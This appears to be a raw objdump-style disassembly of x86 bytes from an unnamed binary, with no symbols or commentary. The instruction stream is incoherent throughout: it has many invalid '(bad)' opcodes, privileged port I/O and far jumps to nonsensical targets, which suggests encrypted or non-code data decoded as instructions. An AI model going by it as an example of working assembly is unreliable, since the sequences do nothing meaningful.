  41a3f0:	lds    edx,FWORD PTR [edi]
  41a3f2:	out    dx,eax
  41a3f3:	mov    WORD PTR [ebx+0x777571ad],ds
  41a3f9:	mov    ebx,edi
  41a3fb:	inc    ebp
  41a3fc:	sub    bh,bl
  41a3fe:	sbb    BYTE PTR [esi+0x50f98fa8],ah
  41a404:	push   cs
  41a405:	nop
  41a406:	jmp    FWORD PTR [ebx]
  41a408:	aad    0xd1
  41a40a:	jae    0x41a3cf
  41a40c:	cmp    eax,0x60668aac
  41a411:	(bad)  
  41a412:	icebp  
  41a413:	dec    ebp
  41a414:	sbb    eax,0x384d5ffc
  41a419:	xchg   ebp,eax
  41a41a:	add    al,ah
  41a41c:	inc    esp
  41a41d:	loopne 0x41a3d5
  41a41f:	jae    0x41a3f3
  41a421:	out    0xa5,al
  41a423:	xor    DWORD PTR [ecx],edx
  41a425:	sbb    BYTE PTR [ebp+edi*2+0x3c],0x22
  41a42a:	mov    es,WORD PTR [ecx+ebx*4-0x5d]
  41a42e:	dec    eax
  41a42f:	int3   
  41a430:	xor    edi,DWORD PTR [eax]
  41a432:	xchg   esi,eax
  41a433:	xor    DWORD PTR [ebx+0x24932aed],ebp
  41a439:	adc    BYTE PTR [ebx],dl
  41a43b:	mov    DWORD PTR [edi-0x49],ecx
  41a43e:	ret    0xdbd0
  41a441:	je     0x41a411
  41a443:	pushf  
  41a444:	ffree  st(3)
  41a446:	retf   
  41a447:	in     al,0x54
  41a449:	test   BYTE PTR [ecx+ebx*2+0xd8b98fd],0x40
  41a451:	ins    BYTE PTR es:[edi],dx
  41a452:	adc    eax,0x29250296
  41a457:	jo     0x41a43d
  41a459:	inc    ebx
  41a45a:	sbb    DWORD PTR [esi],edi
  41a45c:	rcl    al,1
  41a45e:	nop
  41a45f:	sub    DWORD PTR [edx-0x799c86ca],ebp
  41a465:	pusha  
  41a466:	mov    ah,0x7b
  41a468:	js     0x41a4a0
  41a46a:	xchg   edi,eax
  41a46b:	aas    
  41a46c:	lods   al,BYTE PTR ds:[esi]
  41a46d:	jle    0x41a46e
  41a46f:	ja     0x41a42f
  41a471:	iret   
  41a472:	xor    al,0x45
  41a474:	xchg   ebp,eax
  41a475:	mov    ah,0xe
  41a477:	mov    ebp,0x7468aaae
  41a47c:	jl     0x41a4cf
  41a47e:	jl     0x41a45b
  41a480:	sub    eax,0x15a4699a
  41a485:	std    
  41a486:	ja     0x41a473
  41a488:	aaa    
  41a489:	push   ecx
  41a48a:	imul   BYTE PTR [edx-0x2f0e23a0]
  41a490:	fwait
  41a491:	imul   ebx,eax,0x0
  41a494:	ror    DWORD PTR [ecx],cl
  41a496:	adc    BYTE PTR [ecx+0xa],0x40
  41a49a:	inc    ecx
  41a49b:	xchg   ebp,eax
  41a49c:	cdq    
  41a49d:	iret   
  41a49e:	test   DWORD PTR [edx+eiz*4],ecx
  41a4a1:	das    
  41a4a2:	pop    es
  41a4a3:	retf   
  41a4a4:	sub    al,BYTE PTR [eax-0x4725a7a4]
  41a4aa:	mov    al,ds:0xcd56fb96
  41a4af:	les    eax,FWORD PTR [esi+0x18001be6]
  41a4b5:	imul   eax,ebx,0xb459745c
  41a4bb:	add    BYTE PTR [ecx+0x4b],bh
  41a4be:	sub    esi,esi
  41a4c0:	sbb    eax,0x29d0590
  41a4c5:	lods   eax,DWORD PTR ds:[esi]
  41a4c6:	retf   
  41a4c7:	test   al,0x77
  41a4c9:	fadd   DWORD PTR [ebx+eax*8-0x2813c238]
  41a4d0:	repz add ebp,DWORD PTR [edx-0x73d6e6c9]
  41a4d7:	mov    edx,0xc25943cd
  41a4dc:	pop    ecx
  41a4dd:	aas    
  41a4de:	nop
  41a4df:	pop    edi
  41a4e0:	sub    ecx,edx
  41a4e2:	loopne 0x41a46c
  41a4e4:	push   es
  41a4e5:	ret    
  41a4e6:	lods   al,BYTE PTR ds:[esi]
  41a4e7:	xchg   ecx,eax
  41a4e8:	inc    edi
  41a4e9:	lahf   
  41a4ea:	dec    edx
  41a4eb:	add    DWORD PTR [ecx],eax
  41a4ed:	jne    0x41a473
  41a4ef:	mov    edx,0x7ea01f05
  41a4f4:	es inc eax
  41a4f6:	jge    0x41a56e
  41a4f8:	(bad)
  41a4fb:	aam    0x6c
  41a4fd:	sub    bh,BYTE PTR [eax]
  41a4ff:	dec    esp
  41a500:	pop    ebp
  41a501:	jl     0x41a550
  41a503:	and    edi,DWORD PTR [eax+0x704139a1]
  41a509:	fwait
  41a50a:	and    bl,BYTE PTR [ebp+edx*8+0x17]
  41a50e:	and    eax,0x1f2c1e0d
  41a513:	enter  0x13a1,0xdc
  41a517:	shl    DWORD PTR [esi-0x2327f9b8],0x15
  41a51e:	mov    ds:0xfe34c645,eax
  41a523:	enter  0x63d7,0xa
  41a527:	lea    edx,[esi+ebx*2+0x7e690183]
  41a52e:	mov    esi,0x807c94d3
  41a533:	sub    eax,DWORD PTR [ebp+eax*8-0x80]
  41a537:	xor    ecx,edi
  41a539:	cmc    
  41a53a:	rcl    esp,1
  41a53c:	out    dx,al
  41a53d:	sahf   
  41a53e:	cmc    
  41a53f:	push   0xffffffe0
  41a541:	retf   0xdf0f
  41a544:	ss cmp eax,0x168be23e
  41a54a:	xchg   edx,eax
  41a54b:	sti    
  41a54c:	ins    BYTE PTR es:[edi],dx
  41a54d:	jp     0x41a599
  41a54f:	xchg   ecx,eax
  41a550:	dec    esp
  41a551:	sub    ecx,DWORD PTR [edi-0x5f8a296a]
  41a557:	arpl   WORD PTR [ebx+0x61cc4c97],sp
  41a55d:	push   ecx
  41a55e:	mov    eax,ds:0x71111e2d
  41a563:	outs   dx,BYTE PTR gs:[esi]
  41a565:	jbe    0x41a56d
  41a567:	loop   0x41a55e
  41a569:	dec    esi
  41a56a:	mov    dh,0xa4
  41a56c:	imul   edx,DWORD PTR [ecx+ecx*4],0x7d9341fd
  41a573:	call   0x3255d744
  41a578:	popf   
  41a579:	pop    ebp
  41a57a:	dec    edi
  41a57b:	out    dx,eax
  41a57c:	lods   eax,DWORD PTR ds:[esi]
  41a57d:	jge    0x41a52a
  41a57f:	or     al,0x44
  41a581:	adc    BYTE PTR [eax],ah
  41a583:	in     al,0xa8
  41a585:	mov    DWORD PTR [ecx+0x20],eax
  41a588:	jg     0x41a51e
  41a58a:	clc    
  41a58b:	outs   dx,BYTE PTR ds:[esi]
  41a58c:	dec    ecx
  41a58d:	test   DWORD PTR [eax+0x13],ebp
  41a590:	jmp    0x40d8512c
  41a595:	mov    al,ds:0x2bdf79c5
  41a59a:	jmp    0xbe2:0x3086dc8b
  41a5a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5a2:	push   cs
  41a5a3:	jmp    0x5e73:0xbdfcaa79
  41a5aa:	and    BYTE PTR [ebx+0x31],al
  41a5ad:	out    dx,al
  41a5ae:	call   0x4c05bbf6
  41a5b3:	cmp    ah,BYTE PTR [ebp+ebx*1+0x24a9f1b3]
  41a5ba:	jns    0x41a596
  41a5bc:	ins    DWORD PTR es:[edi],dx
  41a5bd:	jecxz  0x41a580
  41a5bf:	mov    al,0x2a
  41a5c1:	repz test eax,edx
  41a5c4:	in     al,0x60
  41a5c6:	jle    0x41a61a
  41a5c8:	or     dh,BYTE PTR [ebx]
  41a5ca:	push   edi
  41a5cb:	repz aaa 
  41a5cd:	pop    es
  41a5ce:	stc    
  41a5cf:	sbb    BYTE PTR [ecx+0x100bbf5d],ah
  41a5d5:	push   es
  41a5d6:	hlt    
  41a5d7:	(bad)  
  41a5d8:	hlt    
  41a5d9:	inc    eax
  41a5da:	hlt    
  41a5db:	sub    eax,0x63420bc9
  41a5e0:	mov    esi,DWORD PTR [esi+eax*8]
  41a5e3:	sbb    BYTE PTR [eax+0x12],0x1b
  41a5e7:	es add al,0x34
  41a5ea:	mov    ebp,0x5655185f
  41a5ef:	in     eax,dx
  41a5f0:	psllq  mm7,QWORD PTR [ebp-0x57e7ab0a]
  41a5f7:	movntq QWORD PTR [ebx+0x70165c68],mm1
  41a5fe:	cmp    al,BYTE PTR [ebp+0x6455c2a3]
  41a604:	mov    edx,0xc79938e2
  41a609:	inc    edi
  41a60a:	sub    dh,BYTE PTR [ebx-0x11]
  41a60d:	pop    ss
  41a60e:	xchg   DWORD PTR [ebp-0x59],esi
  41a611:	(bad)  
  41a612:	mov    ds:0xf665e750,eax
  41a617:	xor    al,al
  41a619:	fld    QWORD PTR [esp+edi*1+0x8479b2b]
  41a620:	sahf   
  41a621:	hlt    
  41a622:	adc    ebp,DWORD PTR [ebp-0x65]
  41a625:	stos   BYTE PTR es:[edi],al
  41a626:	mov    ebp,0xe55acc9d
  41a62b:	sbb    eax,0x319a0a84
  41a630:	inc    eax
  41a631:	sub    bh,bh
  41a633:	enter  0xa3c4,0x5b
  41a637:	jnp    0x41a6a6
  41a639:	lahf   
  41a63a:	mov    gs,WORD PTR ds:0x5403c108
  41a640:	push   edx
  41a641:	jb     0x41a5e7
  41a643:	and    eax,0x202dbf6
  41a648:	sub    eax,edi
  41a64a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a64b:	lods   al,BYTE PTR ds:[esi]
  41a64c:	sbb    eax,0x2a1d44d8
  41a651:	out    0x38,al
  41a653:	cld    
  41a654:	sar    DWORD PTR [ebx],cl
  41a656:	mov    eax,0x73c747a1
  41a65b:	in     eax,dx
  41a65c:	mov    ah,0xe9
  41a65e:	add    DWORD PTR [esi+0x79],eax
  41a661:	sbb    DWORD PTR [edi-0x499a49ef],esi
  41a667:	cmp    bh,cl
  41a669:	xchg   BYTE PTR [ecx+0x64e368de],bl
  41a66f:	neg    BYTE PTR [ebp-0x4d]
  41a672:	enter  0x11a6,0x81
  41a676:	add    eax,0xbc1e9bce
  41a67b:	push   0x32
  41a67d:	xchg   esp,eax
  41a67e:	es stos BYTE PTR es:[edi],al
  41a680:	pop    ebx
  41a681:	mov    ecx,0x31fff2e4
  41a686:	add    al,0x6c
  41a688:	ss ins BYTE PTR es:[edi],dx
  41a68a:	add    eax,0xbe834e95
  41a68f:	mov    bl,0xce
  41a691:	(bad)  
  41a692:	push   eax
  41a693:	fiadd  DWORD PTR [ebx]
  41a695:	test   eax,0xf2aa8144
  41a69a:	aam    0xd7
  41a69c:	and    al,0xce
  41a69e:	jle    0x41a6d0
  41a6a0:	sbb    edi,DWORD PTR [ebx+0x23]
  41a6a3:	push   esi
  41a6a4:	xlat   BYTE PTR ds:[ebx]
  41a6a5:	xchg   ebp,eax
  41a6a6:	call   0x87c11897
  41a6ab:	add    BYTE PTR [ecx+0x7d],0x19
  41a6af:	mov    ebp,0xaf3d696b
  41a6b4:	gs loopne 0x41a687
  41a6b7:	and    DWORD PTR [esi],esi
  41a6b9:	rcl    DWORD PTR [eax],0xde
  41a6bc:	or     al,BYTE PTR [ecx]
  41a6be:	in     al,dx
  41a6bf:	mov    esi,0xa41fd89
  41a6c4:	pop    ds
  41a6c5:	pusha  
  41a6c6:	cmp    eax,0x8516e8a0
  41a6cb:	fstp   TBYTE PTR [edx-0x6c]
  41a6ce:	test   al,0x4b
  41a6d0:	jg     0x41a652
  41a6d2:	jbe    0x41a743
  41a6d4:	cmc    
  41a6d5:	out    0x49,eax
  41a6d7:	in     eax,dx
  41a6d8:	ins    DWORD PTR es:[edi],dx
  41a6d9:	jmp    0x41a678
  41a6db:	sub    DWORD PTR [ecx],edx
  41a6dd:	push   esp
  41a6de:	in     eax,dx
  41a6df:	sar    BYTE PTR [edx+0x20b2d210],0x80
  41a6e6:	imul   edx,edx,0xffffffdd
  41a6e9:	mov    ebx,0xb819c280
  41a6ee:	int    0x2
  41a6f0:	sub    esp,DWORD PTR [ebp+0x20]
  41a6f3:	xchg   edi,eax
  41a6f4:	cmp    dl,BYTE PTR [ecx+0x54c4e300]
  41a6fa:	data16 test BYTE PTR [ebp+0x47],ah
  41a6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6ff:	pcmpgtw mm0,QWORD PTR [eax-0x7a4b3d0a]
  41a706:	inc    esi
  41a707:	pop    esi
  41a708:	and    DWORD PTR [edx-0x485111ca],edx
  41a70e:	ins    DWORD PTR es:[edi],dx
  41a70f:	xor    eax,0x398aed4d
  41a714:	xchg   edx,eax
  41a715:	aad    0xf3
  41a717:	sbb    bl,BYTE PTR [eax-0x49]
  41a71a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a71b:	add    al,0x55
  41a71d:	push   0xffffff92
  41a71f:	mov    WORD PTR [eax-0x5349c415],ss
  41a725:	scas   eax,DWORD PTR es:[edi]
  41a726:	jecxz  0x41a722
  41a728:	or     al,0x57
  41a72a:	js     0x41a6d4
  41a72c:	ins    BYTE PTR es:[edi],dx
  41a72d:	cmp    ch,cl
  41a72f:	sahf   
  41a730:	pop    ebp
  41a731:	fistp  WORD PTR [ecx]
  41a733:	xlat   BYTE PTR ds:[ebx]
  41a734:	jnp    0x41a768
  41a736:	add    BYTE PTR [edi],al
  41a738:	mov    al,ds:0xbd996be8
  41a73d:	jl     0x41a6de
  41a73f:	in     eax,dx
  41a740:	(bad)  [eax]
  41a742:	inc    edi
  41a743:	scas   eax,DWORD PTR es:[edi]
  41a744:	aad    0x60
  41a746:	pusha  
  41a747:	adc    BYTE PTR ds:0x4d3d0481,0x87
  41a74e:	das    
  41a74f:	scas   eax,DWORD PTR es:[edi]
  41a750:	inc    esp
  41a751:	push   ecx
  41a752:	imul   DWORD PTR [esi+0x56f4534f]
  41a758:	aam    0x91
  41a75a:	jle    0x41a760
  41a75c:	je     0x41a77c
  41a75e:	scas   al,BYTE PTR es:[edi]
  41a75f:	mov    dl,0xfc
  41a761:	add    BYTE PTR [esi+0x57b4b31],ah
  41a767:	adc    al,0x96
  41a769:	cmp    ah,bh
  41a76b:	jmp    0xeacb:0xf9e3a189
  41a772:	and    edi,DWORD PTR [edi-0x215e87ab]
  41a778:	call   0x173a:0x799b5d00
  41a77f:	add    al,0xab
  41a781:	adc    esi,esi
  41a783:	mov    DWORD PTR [ebp+0x6ccd0714],eax
  41a789:	cli    
  41a78a:	pop    edi
  41a78b:	jne    0x41a72b
  41a78d:	test   al,0x16
  41a78f:	adc    ah,BYTE PTR [esi+0x243fecd2]
  41a795:	jmp    0x41a7f9
  41a797:	and    ebx,DWORD PTR [edx-0x57]
  41a79a:	inc    ecx
  41a79b:	jo     0x41a7fa
  41a79d:	jle    0x41a7cc
  41a79f:	lahf   
  41a7a0:	clc    
  41a7a1:	cli    
  41a7a2:	jae    0x41a7d3
  41a7a4:	jg     0x41a821
  41a7a6:	fimul  DWORD PTR [ebp+0x53097111]
  41a7ac:	pop    edx
  41a7ad:	xchg   ecx,eax
  41a7ae:	and    bl,dh
  41a7b0:	call   0xcef5:0xb002a716
  41a7b7:	dec    esp
  41a7b8:	xchg   ecx,eax
  41a7b9:	mov    DWORD PTR [esp+ebp*1-0x20c20247],eax
  41a7c0:	imul   esi,DWORD PTR [eax+0x479040ec],0x2e
  41a7c7:	inc    esi
  41a7c8:	jb     0x41a804
  41a7ca:	cdq    
  41a7cb:	lds    ebp,FWORD PTR [ecx-0x582597c5]
  41a7d1:	jg     0x41a7b6
  41a7d3:	pop    DWORD PTR [ecx+ebx*8-0x4c]
  41a7d7:	cld    
  41a7d8:	and    edi,DWORD PTR [ebx+0x52120552]
  41a7de:	sub    bh,BYTE PTR [edi]
  41a7e0:	mov    edx,0x6ead7f30
  41a7e5:	movsx  eax,WORD PTR [esi]
  41a7e8:	push   ecx
  41a7e9:	aas    
  41a7ea:	(bad)  
  41a7eb:	outs   dx,BYTE PTR ds:[esi]
  41a7ec:	pop    edx
  41a7ed:	loope  0x41a7ba
  41a7ef:	jns    0x41a812
  41a7f1:	outs   dx,BYTE PTR ds:[esi]
  41a7f2:	sub    BYTE PTR [ecx+0x43],bl
  41a7f5:	add    ebp,ecx
  41a7f7:	add    ch,ch
  41a7f9:	dec    ecx
  41a7fa:	sahf   
  41a7fb:	dec    ecx
  41a7fc:	or     esi,edi
  41a7fe:	fild   WORD PTR [eax+0x4a]
  41a801:	cmp    DWORD PTR [ebp-0x51],esp
  41a804:	mov    eax,0xd10ae588
  41a809:	push   es
  41a80a:	cmp    eax,0x5af1c306
  41a80f:	xchg   ebp,eax
  41a810:	imul   ebp,DWORD PTR [esi+0x67857ae2],0x3c
  41a817:	shr    edx,1
  41a819:	in     al,0xe4
  41a81b:	or     ecx,ecx
  41a81d:	xor    eax,0x9abae3d0
  41a822:	xchg   esp,eax
  41a823:	into   
  41a824:	jecxz  0x41a7e2
  41a826:	les    edi,FWORD PTR [esi+0x29]
  41a829:	fcomip st,st(3)
  41a82b:	fmul   QWORD PTR [eax]
  41a82d:	(bad)  
  41a82e:	xchg   ebp,eax
  41a82f:	shl    BYTE PTR [eax+0x3cf289ba],0xbb
  41a836:	inc    edi
  41a837:	mov    edi,0x98b8032
  41a83c:	shl    BYTE PTR [esi-0x3e6ed497],1
  41a842:	out    0xe4,eax
  41a844:	(bad)  
  41a845:	jle    0x41a80a
  41a847:	cli    
  41a848:	inc    edx
  41a849:	xor    eax,0x20ece0b0
  41a84e:	ja     0x41a861
  41a850:	sub    eax,0x79188a4d
  41a855:	je     0x41a828
  41a857:	retf   
  41a858:	fimul  WORD PTR [ebx+eax*4-0xc]
  41a85c:	fwait
  41a85d:	lods   al,BYTE PTR ds:[esi]
  41a85e:	adc    ch,BYTE PTR [eax+0x1b]
  41a861:	xor    bl,ah
  41a863:	push   eax
  41a864:	sbb    eax,0x387ee6c7
  41a869:	jns    0x41a848
  41a86b:	es and al,0x95
  41a86e:	or     al,0xb9
  41a870:	pop    edi
  41a871:	and    DWORD PTR [edx+0x57b8c3f2],ebp
  41a877:	mov    ds:0x48128222,eax
  41a87c:	xlat   BYTE PTR ds:[ebx]
  41a87d:	dec    ebp
  41a87e:	hlt    
  41a87f:	rcl    dh,cl
  41a881:	xchg   esi,eax
  41a882:	mov    ebx,0x9e011df7
  41a887:	aad    0x58
  41a889:	popa   
  41a88a:	mov    ah,0x95
  41a88c:	dec    eax
  41a88d:	jge    0x41a8dc
  41a88f:	out    0x10,al
  41a891:	push   esi
  41a892:	sbb    DWORD PTR [ebp+0x48b7eb13],edx
  41a898:	pop    ecx
  41a899:	je     0x41a856
  41a89b:	mov    al,ds:0xd3f4cf60
  41a8a0:	pop    ebp
  41a8a1:	arpl   WORD PTR ds:0xf843cc91,ax
  41a8a7:	pop    ebp
  41a8a8:	out    0x99,eax
  41a8aa:	lock aad 0xb0
  41a8ad:	or     ch,ch
  41a8af:	(bad)  
  41a8b0:	sbb    esi,DWORD PTR [edx+ecx*4-0x5ca73716]
  41a8b7:	or     DWORD PTR [ebp+0x33],0xc
  41a8bb:	sub    eax,0x92c1085
  41a8c0:	mov    DWORD PTR ds:0x79e10f3a,eax
  41a8c6:	dec    edx
  41a8c7:	test   eax,0xb279dc91
  41a8cc:	dec    esp
  41a8cd:	repnz fbld TBYTE PTR [ebp+0x187a43d3]
  41a8d4:	shl    DWORD PTR [ebp+0x1446cff1],cl
  41a8da:	out    dx,al
  41a8db:	or     eax,0x43b47992
  41a8e0:	ins    BYTE PTR es:[edi],dx
  41a8e1:	lods   al,BYTE PTR ds:[esi]
  41a8e2:	xor    al,0x32
  41a8e4:	add    al,0x3e
  41a8e6:	retf   0xd231
  41a8e9:	add    eax,0x3d3eb045
  41a8ee:	div    al
  41a8f0:	fcomp  st(3)
  41a8f2:	jmp    0x1b03:0x2ba6208a
  41a8f9:	ror    BYTE PTR [esi+edi*2],1
  41a8fc:	push   eax
  41a8fd:	fs xchg ebp,eax
  41a8ff:	gs inc ebx
  41a901:	inc    ebx
  41a903:	stc    
  41a904:	inc    ecx
  41a905:	dec    BYTE PTR [edi-0x2a]
  41a908:	sbb    eax,0x15aa6321
  41a90d:	jae    0x41a8fb
  41a90f:	arpl   WORD PTR [ecx-0x26],sp
  41a912:	out    dx,al
  41a913:	test   DWORD PTR [ebp+0x38],edi
  41a916:	adc    edi,0x7f
  41a919:	lahf   
  41a91a:	hlt    
  41a91b:	icebp  
  41a91c:	in     al,dx
  41a91d:	or     al,0xc9
  41a91f:	call   0xb74f05e2
  41a924:	lods   al,BYTE PTR ds:[esi]
  41a925:	xlat   BYTE PTR ds:[ebx]
  41a926:	inc    ebx
  41a927:	mov    dh,0xc1
  41a929:	fwait
  41a92a:	pop    es
  41a92b:	repnz push ebp
  41a92d:	pop    edi
  41a92e:	ins    BYTE PTR es:[edi],dx
  41a92f:	mov    ebx,0xefe3f2a0
  41a934:	arpl   WORD PTR [esi+ebp*1],bp
  41a937:	das    
  41a938:	xchg   edx,eax
  41a939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a93a:	xchg   esp,eax
  41a93b:	pop    ecx
  41a93c:	xor    ebx,ebx
  41a93e:	push   es
  41a93f:	sbb    DWORD PTR [ecx+edx*2],esi
  41a942:	cmp    BYTE PTR [edi-0x67],ah
  41a945:	repnz shr BYTE PTR [eax-0xc],cl
  41a949:	stos   BYTE PTR es:[edi],al
  41a94a:	push   eax
  41a94b:	push   cs
  41a94c:	repz iret 
  41a94e:	mov    esi,0xbc955e58
  41a953:	punpcklwd mm6,DWORD PTR ds:0x6b7127b8
  41a95a:	add    eax,0x93f76cde
  41a95f:	push   0xfffffffd
  41a961:	fsub   DWORD PTR [edi+0x73]
  41a964:	(bad)  
  41a965:	fistp  WORD PTR [ebp-0x1e247a1b]
  41a96b:	(bad)  
  41a96c:	icebp  
  41a96d:	push   cs
  41a96e:	jmp    0x41a97a
  41a970:	xchg   ebx,eax
  41a971:	mov    dh,0xe7
  41a973:	jns    0x41a910
  41a975:	mov    edx,0xd62d7e6c
  41a97a:	inc    edx
  41a97b:	hlt    
  41a97c:	fisub  DWORD PTR [eax]
  41a97e:	xor    dl,bh
  41a980:	outs   dx,DWORD PTR ds:[esi]
  41a981:	inc    esp
  41a982:	and    eax,0x65cb4362
  41a987:	es cdq 
  41a989:	sub    al,BYTE PTR [ecx-0x45]
  41a98c:	rcl    BYTE PTR [ebp+0x5],1
  41a98f:	call   esi
  41a991:	fist   DWORD PTR [ebx-0x43]
  41a994:	xchg   ebx,eax
  41a995:	xchg   edi,eax
  41a996:	jns    0x41a96e
  41a998:	cmc    
  41a999:	(bad)  
  41a99a:	mov    ebp,0x40916279
  41a99f:	sub    DWORD PTR [edi],ebp
  41a9a1:	mov    esp,0x59a0ecec
  41a9a6:	out    dx,al
  41a9a7:	jecxz  0x41a9db
  41a9a9:	fs dec edx
  41a9ab:	add    ebp,esp
  41a9ad:	cmp    edx,edi
  41a9af:	nop
  41a9b0:	and    edx,DWORD PTR [eax-0x27326b5d]
  41a9b6:	push   edi
  41a9b7:	pop    edx
  41a9b8:	leave  
  41a9b9:	or     eax,0x1fbabab6
  41a9be:	lds    ebx,FWORD PTR ds:0xfe0d21a5
  41a9c4:	adc    eax,0x5d208665
  41a9c9:	cld    
  41a9ca:	sub    al,0x6e
  41a9cc:	out    dx,eax
  41a9cd:	pop    es
  41a9ce:	ins    BYTE PTR es:[edi],dx
  41a9cf:	mov    edi,edi
  41a9d1:	xor    cl,BYTE PTR [ecx]
  41a9d3:	and    eax,0xcc7d7106
  41a9d8:	and    edi,DWORD PTR [ebp+esi*8+0x18f7ef51]
  41a9df:	sahf   
  41a9e0:	mov    esi,0xb97f667d
  41a9e5:	loope  0x41a99c
  41a9e7:	xchg   esi,eax
  41a9e8:	jo     0x41a97a
  41a9ea:	das    
  41a9eb:	in     al,dx
  41a9ec:	sub    al,0x29
  41a9ee:	repnz mov ds:0x70b3c1d8,eax
  41a9f4:	into   
  41a9f5:	inc    edx
  41a9f6:	and    ebx,0xffffff84
  41a9f9:	cli    
  41a9fa:	push   ebx
  41a9fb:	cmp    eax,0xb6d15076
  41aa00:	xor    al,0x69
  41aa02:	inc    esp
  41aa03:	mov    ebx,0xa77305ca
  41aa08:	cmp    dl,BYTE PTR [ebp+0x77dc5a2e]
  41aa0e:	cmp    eax,0xa2acda35
  41aa13:	cmp    al,0xf3
  41aa15:	mov    cl,0x37
  41aa17:	mov    WORD PTR [edx],ss
  41aa19:	ins    BYTE PTR es:[edi],dx
  41aa1a:	int    0x9e
  41aa1c:	xchg   BYTE PTR [edi+0x1b],bl
  41aa1f:	lods   al,BYTE PTR ds:[esi]
  41aa20:	clc    
  41aa21:	je     0x41aa76
  41aa23:	mov    ch,0xf0
  41aa25:	(bad)  
  41aa26:	pop    edi
  41aa27:	aas    
  41aa28:	imul   ecx,DWORD PTR [edi+ecx*8],0x4fe26bea
  41aa2f:	mov    bl,0x62
  41aa31:	adc    al,0xe4
  41aa33:	hlt    
  41aa34:	inc    esi
  41aa35:	(bad)  
  41aa36:	sub    BYTE PTR [esi-0x15],ch
  41aa39:	mov    WORD PTR [esi-0x37d2a9aa],fs
  41aa3f:	push   edi
  41aa40:	cmp    al,0x45
  41aa42:	inc    edi
  41aa43:	jmp    0x41aa37
  41aa45:	or     BYTE PTR [ecx-0x21],al
  41aa48:	or     DWORD PTR [ebx-0x54b6ee96],ebp
  41aa4e:	ret    0x271c
  41aa51:	pop    esp
  41aa52:	dec    esp
  41aa53:	jmp    0x9981:0x8582
  41aa59:	mov    ah,0xdb
  41aa5b:	mov    ecx,DWORD PTR [edi]
  41aa5d:	lods   al,BYTE PTR ds:[esi]
  41aa5e:	adc    dl,BYTE PTR [ebx]
  41aa60:	mov    ?,edi
  41aa62:	bound  eax,QWORD PTR [ecx]
  41aa64:	pop    esp
  41aa65:	arpl   di,di
  41aa67:	in     al,0xae
  41aa69:	sbb    esi,edx
  41aa6b:	(bad)  
  41aa6c:	call   0xd19d3015
  41aa71:	adc    eax,DWORD PTR [esi]
  41aa73:	mov    al,0x9b
  41aa75:	loopne 0x41aa2b
  41aa77:	jp     0x41aaf8
  41aa79:	(bad)  
  41aa7a:	mov    al,ds:0x3734ff9
  41aa7f:	xchg   edi,eax
  41aa80:	sub    eax,0x9071c7a5
  41aa85:	xchg   ecx,eax
  41aa86:	(bad)  
  41aa87:	jb     0x41aac4
  41aa89:	jbe    0x41aaa0
  41aa8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa8c:	push   esp
  41aa8d:	sub    bh,BYTE PTR [edi+0x7c]
  41aa90:	test   BYTE PTR [ebx],ah
  41aa92:	inc    ebp
  41aa93:	ret    0xba26
  41aa96:	cld    
  41aa97:	xor    al,0xc1
  41aa99:	jo     0x41aaaf
  41aa9b:	xchg   edx,eax
  41aa9c:	mov    al,ds:0xcab71b
  41aaa1:	jno    0x41aacc
  41aaa3:	xchg   esi,eax
  41aaa4:	jecxz  0x41aa28
  41aaa6:	shl    DWORD PTR [edx+edi*1+0x7],cl
  41aaaa:	and    BYTE PTR [edi+edx*2+0x3017de23],0x44
  41aab2:	jnp    0x41ab0b
  41aab4:	ret    
  41aab5:	addr16 js 0x41ab0c
  41aab8:	cmp    BYTE PTR [edx-0x33],bh
  41aabb:	fucomi st,st(5)
  41aabd:	daa    
  41aabe:	pop    ds
  41aabf:	pop    eax
  41aac0:	and    al,0x80
  41aac2:	mov    ebx,ebp
  41aac4:	leave  
  41aac5:	lods   eax,DWORD PTR ds:[esi]
  41aac6:	and    bh,BYTE PTR [eax+0x55]
  41aac9:	adc    ah,dh
  41aacb:	pop    ecx
  41aacc:	popa   
  41aacd:	mov    ah,0x22
  41aacf:	jo     0x41ab2b
  41aad1:	popa   
  41aad2:	out    dx,al
  41aad3:	sub    DWORD PTR [ebp+eax*2+0x30123455],esi
  41aada:	xor    BYTE PTR [ebx+edx*1+0x2b],cl
  41aade:	add    al,0xd2
  41aae0:	push   ebx
  41aae1:	pop    ebx
  41aae2:	push   esi
  41aae3:	hlt    
  41aae4:	cwde   
  41aae5:	mov    eax,0x314fa889
  41aaea:	fs inc ecx
  41aaec:	add    al,0x24
  41aaee:	dec    esi
  41aaef:	mov    ch,BYTE PTR [ecx+ecx*4-0x29]
  41aaf3:	psrlq  mm1,QWORD PTR [ecx+0x23]
  41aaf7:	mov    ebx,0x8094b48e
  41aafc:	pusha  
  41aafd:	xor    cl,BYTE PTR [eax-0x27643764]
  41ab03:	mov    edx,0x20cf112
  41ab08:	repz imul edx
  41ab0b:	es div ah
  41ab0e:	mov    dl,0xa7
  41ab10:	out    0xfb,eax
  41ab12:	leave  
  41ab13:	jmp    0x989c:0xb6d35668
  41ab1a:	dec    ecx
  41ab1b:	jge    0x41aade
  41ab1d:	out    dx,al
  41ab1e:	std    
  41ab1f:	inc    edi
  41ab20:	sub    eax,0x818cbf0b
  41ab25:	or     DWORD PTR [ebx+eax*1],0xffffffea
  41ab29:	retf   0x1a08
  41ab2c:	push   eax
  41ab2d:	ret    0x198b
  41ab30:	push   eax
  41ab31:	icebp  
  41ab32:	jmp    0x41aacd
  41ab34:	frstor [ebx-0x414e3bee]
  41ab3a:	jnp    0x41ab39
  41ab3c:	test   bh,bl
  41ab3e:	ins    BYTE PTR es:[edi],dx
  41ab3f:	out    0x96,eax
  41ab41:	jle    0x41ab24
  41ab43:	push   ds
  41ab44:	scas   eax,DWORD PTR es:[edi]
  41ab45:	lods   eax,DWORD PTR ds:[esi]
  41ab46:	push   0xffffffe7
  41ab48:	fbstp  TBYTE PTR [edx+edx*1+0xc]
  41ab4c:	fimul  DWORD PTR [ebp-0xc]
  41ab4f:	mov    BYTE PTR [ecx+0x67],cl
  41ab52:	xor    BYTE PTR [edx+esi*4],al
  41ab55:	or     BYTE PTR [ebp+0x28],0x79
  41ab59:	std    
  41ab5a:	mov    dh,0x68
  41ab5c:	dec    dx
  41ab5e:	(bad)  
  41ab5f:	mov    ebx,0x96197a04
  41ab64:	xor    eax,0xa0e31489
